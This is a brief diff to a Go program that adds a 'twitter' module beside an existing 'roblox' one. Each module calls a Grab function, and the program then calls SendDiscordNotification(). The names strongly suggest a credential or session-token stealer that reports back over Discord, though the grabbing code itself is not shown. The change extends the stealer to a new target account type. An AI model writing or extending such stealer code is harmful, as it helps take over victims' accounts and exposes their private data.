@@ -47,5 +47,8 @@ func main() {
 	if strings.Contains(modulesEnabled, "roblox") {
 		GrabRoblox()
 	}
+	if strings.Contains(modulesEnabled, "twitter") {
+		GrabTwitter()
+	}
 	_ = SendDiscordNotification()
 }
